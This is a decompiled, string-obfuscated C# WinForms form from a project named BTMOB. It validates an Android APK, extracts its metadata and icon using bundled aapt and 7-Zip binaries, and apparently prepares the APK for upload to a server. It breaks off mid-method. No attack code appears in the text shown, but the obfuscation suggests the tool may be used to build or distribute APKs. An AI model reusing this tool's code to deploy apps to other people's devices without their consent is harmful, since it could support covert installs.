using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Runtime.CompilerServices;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using BTMOB.My.Resources;
using DrakeUI.Framework;
using Microsoft.VisualBasic.CompilerServices;
using Newtonsoft.Json;

namespace BTMOB;

[DesignerGenerated]
public class UploadApp : basestyle
{
	[CompilerGenerated]
	internal sealed class _Closure_0024__54_002D0
	{
		public string _0024VB_0024Local_appName;

		public string _0024VB_0024Local_packageName;

		public string _0024VB_0024Local_Vername;

		public UploadApp _0024VB_0024Me;

		public _Closure_0024__54_002D0(_Closure_0024__54_002D0 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024Local_appName = arg0._0024VB_0024Local_appName;
				_0024VB_0024Local_packageName = arg0._0024VB_0024Local_packageName;
				_0024VB_0024Local_Vername = arg0._0024VB_0024Local_Vername;
			}
		}

		[SpecialName]
		internal void _Lambda_0024__0()
		{
			_0024VB_0024Me.nametext.Text = "الأسم: " + _0024VB_0024Local_appName;
			_0024VB_0024Me.pkgtext.Text = "المعرف: " + _0024VB_0024Local_packageName;
			_0024VB_0024Me.vernamtext.Text = "اسم الاصدار: " + _0024VB_0024Local_Vername;
		}

		[SpecialName]
		internal void _Lambda_0024__1()
		{
			_0024VB_0024Me.nametext.Text = "姓名: " + _0024VB_0024Local_appName;
			_0024VB_0024Me.pkgtext.Text = "标识符: " + _0024VB_0024Local_packageName;
			_0024VB_0024Me.vernamtext.Text = "版本名称: " + _0024VB_0024Local_Vername;
		}

		[SpecialName]
		internal void _Lambda_0024__2()
		{
			_0024VB_0024Me.nametext.Text = "Имя приложения: " + _0024VB_0024Local_appName;
			_0024VB_0024Me.pkgtext.Text = "Имя пакета: " + _0024VB_0024Local_packageName;
			_0024VB_0024Me.vernamtext.Text = "Название версии: " + _0024VB_0024Local_Vername;
		}

		[SpecialName]
		internal void _Lambda_0024__3()
		{
			_0024VB_0024Me.nametext.Text = "Uygulama Adı: " + _0024VB_0024Local_appName;
			_0024VB_0024Me.pkgtext.Text = "Paket Adı: " + _0024VB_0024Local_packageName;
			_0024VB_0024Me.vernamtext.Text = "Sürüm Adı: " + _0024VB_0024Local_Vername;
		}

		[SpecialName]
		internal void _Lambda_0024__4()
		{
			_0024VB_0024Me.nametext.Text = "Nombre de la App: " + _0024VB_0024Local_appName;
			_0024VB_0024Me.pkgtext.Text = "Nombre del Paquete: " + _0024VB_0024Local_packageName;
			_0024VB_0024Me.vernamtext.Text = "Nombre de Versión: " + _0024VB_0024Local_Vername;
		}

		[SpecialName]
		internal void _Lambda_0024__5()
		{
			_0024VB_0024Me.nametext.Text = "Nome do App: " + _0024VB_0024Local_appName;
			_0024VB_0024Me.pkgtext.Text = "Nome do Pacote: " + _0024VB_0024Local_packageName;
			_0024VB_0024Me.vernamtext.Text = "Nome da Versão: " + _0024VB_0024Local_Vername;
		}

		[SpecialName]
		internal void _Lambda_0024__6()
		{
			_0024VB_0024Me.nametext.Text = "App Name: " + _0024VB_0024Local_appName;
			_0024VB_0024Me.pkgtext.Text = "Package Name: " + _0024VB_0024Local_packageName;
			_0024VB_0024Me.vernamtext.Text = "Version Name: " + _0024VB_0024Local_Vername;
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__55_002D0
	{
		public string _0024VB_0024Local_tempDir;

		public string _0024VB_0024Local_finalIcon;

		public UploadApp _0024VB_0024Me;

		public _Closure_0024__55_002D0(_Closure_0024__55_002D0 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024Local_tempDir = arg0._0024VB_0024Local_tempDir;
				_0024VB_0024Local_finalIcon = arg0._0024VB_0024Local_finalIcon;
			}
		}

		[SpecialName]
		internal void _Lambda_0024__0()
		{
			try
			{
				_0024VB_0024Me.apkicon.Image = Resources.androidhead;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			try
			{
				if (Directory.Exists(_0024VB_0024Local_tempDir))
				{
					Directory.Delete(_0024VB_0024Local_tempDir, recursive: true);
				}
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
		}

		[SpecialName]
		internal void _Lambda_0024__1()
		{
			try
			{
				_0024VB_0024Me.apkicon.Image = codes.ReadBitmapFromFile(_0024VB_0024Local_finalIcon);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				_0024VB_0024Me.apkicon.Image = Resources.androidhead;
				ProjectData.ClearProjectError();
			}
			try
			{
				if (Directory.Exists(_0024VB_0024Local_tempDir))
				{
					Directory.Delete(_0024VB_0024Local_tempDir, recursive: true);
				}
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
		}
	}

	private IContainer components;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("upbtn")]
	private DrakeUIButtonIcon _upbtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("BackgroundWorker1")]
	private BackgroundWorker _BackgroundWorker1;

	public string TargetAPKPATH;

	public HttpClient httpClient;

	public string serverip;

	[field: AccessedThroughProperty("uploadbar")]
	internal virtual DrakeUIProcessBar uploadbar
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("lblStatus")]
	internal virtual Label lblStatus
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel2")]
	internal virtual Panel Panel2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("titlespanel")]
	internal virtual Panel titlespanel
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("vernamtext")]
	internal virtual Label vernamtext
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("pkgtext")]
	internal virtual Label pkgtext
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("nametext")]
	internal virtual Label nametext
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("apkicon")]
	internal virtual PictureBox apkicon
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIButtonIcon upbtn
	{
		[CompilerGenerated]
		get
		{
			return _upbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = upbtn_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _upbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_upbtn = value;
			drakeUIButtonIcon = _upbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual BackgroundWorker BackgroundWorker1
	{
		[CompilerGenerated]
		get
		{
			return _BackgroundWorker1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			DoWorkEventHandler value2 = BackgroundWorker1_DoWork;
			BackgroundWorker backgroundWorker = _BackgroundWorker1;
			if (backgroundWorker != null)
			{
				backgroundWorker.DoWork -= value2;
			}
			_BackgroundWorker1 = value;
			backgroundWorker = _BackgroundWorker1;
			if (backgroundWorker != null)
			{
				backgroundWorker.DoWork += value2;
			}
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(BTMOB.UploadApp));
		this.uploadbar = new DrakeUI.Framework.DrakeUIProcessBar();
		this.lblStatus = new System.Windows.Forms.Label();
		this.Panel2 = new System.Windows.Forms.Panel();
		this.upbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.titlespanel = new System.Windows.Forms.Panel();
		this.vernamtext = new System.Windows.Forms.Label();
		this.pkgtext = new System.Windows.Forms.Label();
		this.nametext = new System.Windows.Forms.Label();
		this.apkicon = new System.Windows.Forms.PictureBox();
		this.BackgroundWorker1 = new System.ComponentModel.BackgroundWorker();
		((System.ComponentModel.ISupportInitialize)this.myscr).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.myico).BeginInit();
		this.tobpanelsti.SuspendLayout();
		this.Panel2.SuspendLayout();
		this.titlespanel.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.apkicon).BeginInit();
		base.SuspendLayout();
		this.pinbtn.Location = new System.Drawing.Point(322, 5);
		this.minibtn.Location = new System.Drawing.Point(364, 5);
		this.closbtn.Location = new System.Drawing.Point(406, 5);
		this.mytitle.Size = new System.Drawing.Size(438, 19);
		this.tobpanelsti.Size = new System.Drawing.Size(448, 29);
		this.uploadbar.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.uploadbar.FillColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.uploadbar.Font = new System.Drawing.Font(EXGuarder._69491E2C, 8.5f);
		this.uploadbar.ForeColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.uploadbar.Location = new System.Drawing.Point(2, 273);
		this.uploadbar.MinimumSize = new System.Drawing.Size(70, 23);
		this.uploadbar.Name = EXGuarder._2A572153;
		this.uploadbar.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
		this.uploadbar.RectColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.uploadbar.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.None;
		this.uploadbar.ShowValue = false;
		this.uploadbar.Size = new System.Drawing.Size(448, 23);
		this.uploadbar.Style = DrakeUI.Framework.UIStyle.Custom;
		this.uploadbar.TabIndex = 0;
		this.uploadbar.Text = EXGuarder._60344464;
		this.uploadbar.Visible = false;
		this.lblStatus.Dock = System.Windows.Forms.DockStyle.Fill;
		this.lblStatus.Font = new System.Drawing.Font(EXGuarder._69491E2C, 10f, System.Drawing.FontStyle.Bold);
		this.lblStatus.Location = new System.Drawing.Point(2, 174);
		this.lblStatus.Name = EXGuarder._56695A42;
		this.lblStatus.Size = new System.Drawing.Size(448, 53);
		this.lblStatus.TabIndex = 1;
		this.lblStatus.Text = EXGuarder._06040719;
		this.lblStatus.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
		this.Panel2.Controls.Add(this.upbtn);
		this.Panel2.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.Panel2.Location = new System.Drawing.Point(2, 227);
		this.Panel2.Name = EXGuarder._5D4C451A;
		this.Panel2.Padding = new System.Windows.Forms.Padding(4);
		this.Panel2.Size = new System.Drawing.Size(448, 46);
		this.Panel2.TabIndex = 40;
		this.upbtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.upbtn.Dock = System.Windows.Forms.DockStyle.Right;
		this.upbtn.Enabled = false;
		this.upbtn.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.upbtn.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.upbtn.FillHoverColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.upbtn.FillPressColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.upbtn.FillSelectedColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.upbtn.Font = new System.Drawing.Font(EXGuarder._69491E2C, 10f, System.Drawing.FontStyle.Bold);
		this.upbtn.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.upbtn.ForeHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.upbtn.ForePressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.upbtn.ForeSelectedColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.upbtn.Location = new System.Drawing.Point(293, 4);
		this.upbtn.Name = EXGuarder._3053195C;
		this.upbtn.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.upbtn.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.upbtn.RectHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.upbtn.RectPressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.upbtn.RectSelectedColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.upbtn.Size = new System.Drawing.Size(151, 38);
		this.upbtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.upbtn.SymbolSize = 21;
		this.upbtn.TabIndex = 67;
		this.upbtn.Text = EXGuarder._526C4D49;
		this.titlespanel.Controls.Add(this.vernamtext);
		this.titlespanel.Controls.Add(this.pkgtext);
		this.titlespanel.Controls.Add(this.nametext);
		this.titlespanel.Controls.Add(this.apkicon);
		this.titlespanel.Dock = System.Windows.Forms.DockStyle.Top;
		this.titlespanel.Location = new System.Drawing.Point(2, 67);
		this.titlespanel.Name = EXGuarder._63581B4B;
		this.titlespanel.Size = new System.Drawing.Size(448, 107);
		this.titlespanel.TabIndex = 51;
		this.vernamtext.Cursor = System.Windows.Forms.Cursors.Hand;
		this.vernamtext.Dock = System.Windows.Forms.DockStyle.Top;
		this.vernamtext.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.vernamtext.Font = new System.Drawing.Font(EXGuarder._46781D1B, 9f);
		this.vernamtext.Location = new System.Drawing.Point(126, 46);
		this.vernamtext.Name = EXGuarder._31401833;
		this.vernamtext.Size = new System.Drawing.Size(322, 23);
		this.vernamtext.TabIndex = 51;
		this.vernamtext.Text = EXGuarder._4F3E0046;
		this.vernamtext.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.pkgtext.Cursor = System.Windows.Forms.Cursors.Hand;
		this.pkgtext.Dock = System.Windows.Forms.DockStyle.Top;
		this.pkgtext.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.pkgtext.Font = new System.Drawing.Font(EXGuarder._46781D1B, 9f);
		this.pkgtext.Location = new System.Drawing.Point(126, 23);
		this.pkgtext.Name = EXGuarder._255C4E3A;
		this.pkgtext.Size = new System.Drawing.Size(322, 23);
		this.pkgtext.TabIndex = 49;
		this.pkgtext.Text = EXGuarder._6F20205D;
		this.pkgtext.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.nametext.Cursor = System.Windows.Forms.Cursors.Hand;
		this.nametext.Dock = System.Windows.Forms.DockStyle.Top;
		this.nametext.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.nametext.Font = new System.Drawing.Font(EXGuarder._46781D1B, 9f);
		this.nametext.Location = new System.Drawing.Point(126, 0);
		this.nametext.Name = EXGuarder._66244D1C;
		this.nametext.Size = new System.Drawing.Size(322, 23);
		this.nametext.TabIndex = 48;
		this.nametext.Text = EXGuarder._205D3D31;
		this.nametext.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.apkicon.BackColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.apkicon.Dock = System.Windows.Forms.DockStyle.Left;
		this.apkicon.Location = new System.Drawing.Point(0, 0);
		this.apkicon.Name = EXGuarder._064D785B;
		this.apkicon.Size = new System.Drawing.Size(126, 107);
		this.apkicon.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
		this.apkicon.TabIndex = 52;
		this.apkicon.TabStop = false;
		base.AutoScaleDimensions = new System.Drawing.SizeF(8f, 18f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		base.ClientSize = new System.Drawing.Size(452, 298);
		base.Controls.Add(this.lblStatus);
		base.Controls.Add(this.titlespanel);
		base.Controls.Add(this.Panel2);
		base.Controls.Add(this.uploadbar);
		base.Icon = (System.Drawing.Icon)resources.GetObject(EXGuarder._376B431A);
		base.Name = EXGuarder._5D557033;
		this.Text = EXGuarder._5D557033;
		base.Controls.SetChildIndex(this.uploadbar, 0);
		base.Controls.SetChildIndex(this.tobpanelsti, 0);
		base.Controls.SetChildIndex(this.Panel2, 0);
		base.Controls.SetChildIndex(this.titlespanel, 0);
		base.Controls.SetChildIndex(this.lblStatus, 0);
		((System.ComponentModel.ISupportInitialize)this.myscr).EndInit();
		((System.ComponentModel.ISupportInitialize)this.myico).EndInit();
		this.tobpanelsti.ResumeLayout(false);
		this.Panel2.ResumeLayout(false);
		this.titlespanel.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.apkicon).EndInit();
		base.ResumeLayout(false);
	}

	public UploadApp()
	{
		base.Load += UploadApp_Load;
		InitializeComponent();
	}

	public void UpdateProgress(int percent)
	{
		if (base.InvokeRequired)
		{
			Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
			{
				UpdateProgress(percent);
			}));
		}
		else
		{
			uploadbar.Value = Math.Min(Math.Max(percent, 0), 100);
			lblStatus.Text = string.Format(EXGuarder._341C6128, BTConst.uploadingstr, percent);
		}
	}

	public void ShowResponse(string responseText)
	{
		if (base.InvokeRequired)
		{
			Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
			{
				ShowResponse(responseText);
			}));
		}
		else
		{
			lblStatus.Text = responseText;
		}
	}

	public void UpdateState(string state, Color color)
	{
		if (base.InvokeRequired)
		{
			Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
			{
				UpdateState(state, color);
			}));
		}
		else
		{
			lblStatus.ForeColor = color;
			lblStatus.Text = state;
		}
	}

	public void Endit(bool allgood)
	{
		if (base.InvokeRequired)
		{
			Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
			{
				Endit(allgood);
			}));
			return;
		}
		if (allgood)
		{
			apkicon.Image = Resources.ok;
		}
		else
		{
			apkicon.Image = Resources.no;
		}
		uploadbar.Visible = false;
		upbtn.Text = BTConst.extstr;
		upbtn.TagString = EXGuarder._366E6F77;
		upbtn.Enabled = true;
	}

	public void waitstate()
	{
		if (base.InvokeRequired)
		{
			Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
			{
				waitstate();
			}));
		}
		else
		{
			lblStatus.ForeColor = Color.FromArgb(2, 176, 117);
			lblStatus.Text = BTConst.appchkstr;
			Endit(allgood: true);
		}
	}

	private void EnsureBinaries()
	{
		WriteIfMissing(Path.Combine(MyRes.BTCache_path, EXGuarder._13603F29), Resources.aapt);
		WriteIfMissing(Path.Combine(MyRes.BTCache_path, EXGuarder._646E6E2C), Resources.libwinpthread_1);
		WriteIfMissing(Path.Combine(MyRes.BTCache_path, EXGuarder._26253531), Resources._7);
	}

	private void WriteIfMissing(string filePath, byte[] data)
	{
		if (!File.Exists(filePath))
		{
			File.WriteAllBytes(filePath, data);
		}
	}

	private void BackgroundWorker1_DoWork(object sender, DoWorkEventArgs e)
	{
		if (string.IsNullOrEmpty(TargetAPKPATH))
		{
			return;
		}
		_Closure_0024__54_002D0 arg = default(_Closure_0024__54_002D0);
		_Closure_0024__54_002D0 CS_0024_003C_003E8__locals49 = new _Closure_0024__54_002D0(arg);
		CS_0024_003C_003E8__locals49._0024VB_0024Me = this;
		ApkValidator.ApkValidationResult apkValidationResult = ApkValidator.ValidateApk(TargetAPKPATH);
		if (!apkValidationResult.IsValid)
		{
			BTAlerter.erroes(apkValidationResult.Message);
			UpdateState(string.Format(EXGuarder._6E4B5B6A, apkValidationResult.Message), Color.Red);
			Endit(allgood: false);
			return;
		}
		UpdateState(string.Format(EXGuarder._6E4B5B6A, BTConst.okchkinfstr), Color.DeepSkyBlue);
		EnsureBinaries();
		string fileName = Path.Combine(MyRes.BTCache_path, EXGuarder._3C074133);
		string sevenZipPath = Path.Combine(MyRes.BTCache_path, EXGuarder._1E47433F);
		string text = codes.CommandWithOutput(fileName, EXGuarder._48600152 + codes.QuoteArg(TargetAPKPATH), 15000);
		if (string.IsNullOrWhiteSpace(text))
		{
			ShowResponse(string.Format(EXGuarder._3B204F10, BTConst.fldredapkstr));
			Environment.ExitCode = 1;
			return;
		}
		CS_0024_003C_003E8__locals49._0024VB_0024Local_packageName = Conversions.ToString(codes.RegexMatcher(EXGuarder._4D21383D, text));
		CS_0024_003C_003E8__locals49._0024VB_0024Local_Vername = Conversions.ToString(codes.RegexMatcher(EXGuarder._1C03610C, text));
		CS_0024_003C_003E8__locals49._0024VB_0024Local_appName = Conversions.ToString(codes.RegexMatcher(EXGuarder._75157349, text));
		if (string.IsNullOrEmpty(CS_0024_003C_003E8__locals49._0024VB_0024Local_appName))
		{
			MatchCollection matchCollection = Regex.Matches(text, EXGuarder._45341F34);
			if (matchCollection.Count > 0)
			{
				foreach (Match item in matchCollection)
				{
					string value = item.Groups[1].Value;
					CS_0024_003C_003E8__locals49._0024VB_0024Local_appName = value;
				}
			}
			else
			{
				CS_0024_003C_003E8__locals49._0024VB_0024Local_appName = EXGuarder._3E565F49;
			}
		}
		string left = codes.locallanguage();
		if (Operators.CompareString(left, EXGuarder._4B5C3925, TextCompare: false) != 0)
		{
			if (Operators.CompareString(left, EXGuarder._08234655, TextCompare: false) != 0)
			{
				if (Operators.CompareString(left, EXGuarder._10000D36, TextCompare: false) != 0)
				{
					if (Operators.CompareString(left, EXGuarder._00081051, TextCompare: false) != 0)
					{
						if (Operators.CompareString(left, EXGuarder._78320248, TextCompare: false) != 0)
						{
							if (Operators.CompareString(left, EXGuarder._5037414D, TextCompare: false) == 0)
							{
								Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
								{
									CS_0024_003C_003E8__locals49._0024VB_0024Me.nametext.Text = "Nome do App: " + CS_0024_003C_003E8__locals49._0024VB_0024Local_appName;
									CS_0024_003C_003E8__locals49._0024VB_0024Me.pkgtext.Text = "Nome do Pacote: " + CS_0024_003C_003E8__locals49._0024VB_0024Local_packageName;
									CS_0024_003C_003E8__locals49._0024VB_0024Me.vernamtext.Text = "Nome da Versão: " + CS_0024_003C_003E8__locals49._0024VB_0024Local_Vername;
								}));
							}
							else
							{
								Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
								{
									CS_0024_003C_003E8__locals49._0024VB_0024Me.nametext.Text = "App Name: " + CS_0024_003C_003E8__locals49._0024VB_0024Local_appName;
									CS_0024_003C_003E8__locals49._0024VB_0024Me.pkgtext.Text = "Package Name: " + CS_0024_003C_003E8__locals49._0024VB_0024Local_packageName;
									CS_0024_003C_003E8__locals49._0024VB_0024Me.vernamtext.Text = "Version Name: " + CS_0024_003C_003E8__locals49._0024VB_0024Local_Vername;
								}));
							}
						}
						else
						{
							Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
							{
								CS_0024_003C_003E8__locals49._0024VB_0024Me.nametext.Text = "Nombre de la App: " + CS_0024_003C_003E8__locals49._0024VB_0024Local_appName;
								CS_0024_003C_003E8__locals49._0024VB_0024Me.pkgtext.Text = "Nombre del Paquete: " + CS_0024_003C_003E8__locals49._0024VB_0024Local_packageName;
								CS_0024_003C_003E8__locals49._0024VB_0024Me.vernamtext.Text = "Nombre de Versión: " + CS_0024_003C_003E8__locals49._0024VB_0024Local_Vername;
							}));
						}
					}
					else
					{
						Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
						{
							CS_0024_003C_003E8__locals49._0024VB_0024Me.nametext.Text = "Uygulama Adı: " + CS_0024_003C_003E8__locals49._0024VB_0024Local_appName;
							CS_0024_003C_003E8__locals49._0024VB_0024Me.pkgtext.Text = "Paket Adı: " + CS_0024_003C_003E8__locals49._0024VB_0024Local_packageName;
							CS_0024_003C_003E8__locals49._0024VB_0024Me.vernamtext.Text = "Sürüm Adı: " + CS_0024_003C_003E8__locals49._0024VB_0024Local_Vername;
						}));
					}
				}
				else
				{
					Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
					{
						CS_0024_003C_003E8__locals49._0024VB_0024Me.nametext.Text = "Имя приложения: " + CS_0024_003C_003E8__locals49._0024VB_0024Local_appName;
						CS_0024_003C_003E8__locals49._0024VB_0024Me.pkgtext.Text = "Имя пакета: " + CS_0024_003C_003E8__locals49._0024VB_0024Local_packageName;
						CS_0024_003C_003E8__locals49._0024VB_0024Me.vernamtext.Text = "Название версии: " + CS_0024_003C_003E8__locals49._0024VB_0024Local_Vername;
					}));
				}
			}
			else
			{
				Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
				{
					CS_0024_003C_003E8__locals49._0024VB_0024Me.nametext.Text = "姓名: " + CS_0024_003C_003E8__locals49._0024VB_0024Local_appName;
					CS_0024_003C_003E8__locals49._0024VB_0024Me.pkgtext.Text = "标识符: " + CS_0024_003C_003E8__locals49._0024VB_0024Local_packageName;
					CS_0024_003C_003E8__locals49._0024VB_0024Me.vernamtext.Text = "版本名称: " + CS_0024_003C_003E8__locals49._0024VB_0024Local_Vername;
				}));
			}
		}
		else
		{
			Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
			{
				CS_0024_003C_003E8__locals49._0024VB_0024Me.nametext.Text = "الأسم: " + CS_0024_003C_003E8__locals49._0024VB_0024Local_appName;
				CS_0024_003C_003E8__locals49._0024VB_0024Me.pkgtext.Text = "المعرف: " + CS_0024_003C_003E8__locals49._0024VB_0024Local_packageName;
				CS_0024_003C_003E8__locals49._0024VB_0024Me.vernamtext.Text = "اسم الاصدار: " + CS_0024_003C_003E8__locals49._0024VB_0024Local_Vername;
			}));
		}
		Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
		{
			if (apkicon.Image != null)
			{
				apkicon.Image.Dispose();
				apkicon.Image = null;
			}
		}));
		ExtractIconToBundle(sevenZipPath, TargetAPKPATH, text);
		UpdateState(EXGuarder._383E3E26, Color.Lime);
		Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
		{
			upbtn.Enabled = true;
		}));
	}

	private object ExtractIconToBundle(string sevenZipPath, string apkPath, string apkInfo)
	{
		_Closure_0024__55_002D0 arg = default(_Closure_0024__55_002D0);
		_Closure_0024__55_002D0 CS_0024_003C_003E8__locals16 = new _Closure_0024__55_002D0(arg);
		CS_0024_003C_003E8__locals16._0024VB_0024Me = this;
		CS_0024_003C_003E8__locals16._0024VB_0024Local_tempDir = Path.Combine(Path.GetTempPath(), Path.GetRandomFileName());
		Directory.CreateDirectory(CS_0024_003C_003E8__locals16._0024VB_0024Local_tempDir);
		CS_0024_003C_003E8__locals16._0024VB_0024Local_finalIcon = Path.Combine(CS_0024_003C_003E8__locals16._0024VB_0024Local_tempDir, EXGuarder._0B403116);
		string[] array = new string[5]
		{
			EXGuarder._2D77166C,
			EXGuarder._661B5C14,
			EXGuarder._0B19683D,
			EXGuarder._3B1A383E,
			EXGuarder._071C6B12
		};
		string text = null;
		string[] array2 = array;
		foreach (string text2 in array2)
		{
			text = Conversions.ToString(codes.RegexMatcher(EXGuarder._67772B6C + text2 + EXGuarder._12452A28, apkInfo));
			if (!string.IsNullOrWhiteSpace(text))
			{
				break;
			}
		}
		if (!string.IsNullOrWhiteSpace(text))
		{
			if (text.EndsWith(EXGuarder._44211862, StringComparison.OrdinalIgnoreCase))
			{
				text = text.Replace(EXGuarder._44211862, EXGuarder._5D0B685F);
			}
			string fileName = Path.GetFileName(text);
			if (!string.IsNullOrWhiteSpace(fileName))
			{
				string text3 = codes.CommandWithOutput(sevenZipPath, EXGuarder._7272455C + codes.QuoteArg(apkPath), 10000);
				if (!string.IsNullOrWhiteSpace(text3))
				{
					string value = null;
					string[] array3 = text3.Split(new string[1] { Environment.NewLine }, StringSplitOptions.RemoveEmptyEntries);
					foreach (string text4 in array3)
					{
						if (text4.Contains(fileName) && text4.Contains(EXGuarder._434C1769))
						{
							string[] array4 = text4.Trim().Split(new char[1] { ' ' }, StringSplitOptions.RemoveEmptyEntries);
							string text5 = array4[checked(array4.Length - 1)];
							value = text5;
							break;
						}
					}
					if (!string.IsNullOrWhiteSpace(value))
					{
						string arguments = string.Format(EXGuarder._1108300F, codes.QuoteArg(apkPath), codes.QuoteArg(value), codes.QuoteArg(CS_0024_003C_003E8__locals16._0024VB_0024Local_tempDir));
						codes.CommandWithOutput(sevenZipPath, arguments, 10000);
						string text6 = Directory.GetFiles(CS_0024_003C_003E8__locals16._0024VB_0024Local_tempDir, EXGuarder._2C5C7275, SearchOption.AllDirectories).FirstOrDefault();
						if (text6 != null)
						{
							File.Copy(text6, CS_0024_003C_003E8__locals16._0024VB_0024Local_finalIcon, overwrite: true);
							goto IL_03f4;
						}
					}
				}
			}
		}
		try
		{
			Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
			{
				try
				{
					CS_0024_003C_003E8__locals16._0024VB_0024Me.apkicon.Image = Resources.androidhead;
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
				try
				{
					if (Directory.Exists(CS_0024_003C_003E8__locals16._0024VB_0024Local_tempDir))
					{
						Directory.Delete(CS_0024_003C_003E8__locals16._0024VB_0024Local_tempDir, recursive: true);
					}
				}
				catch (Exception projectError3)
				{
					ProjectData.SetProjectError(projectError3);
					ProjectData.ClearProjectError();
				}
			}));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			goto IL_040e;
		}
		goto IL_03f4;
		IL_03f4:
		Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
		{
			try
			{
				CS_0024_003C_003E8__locals16._0024VB_0024Me.apkicon.Image = codes.ReadBitmapFromFile(CS_0024_003C_003E8__locals16._0024VB_0024Local_finalIcon);
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
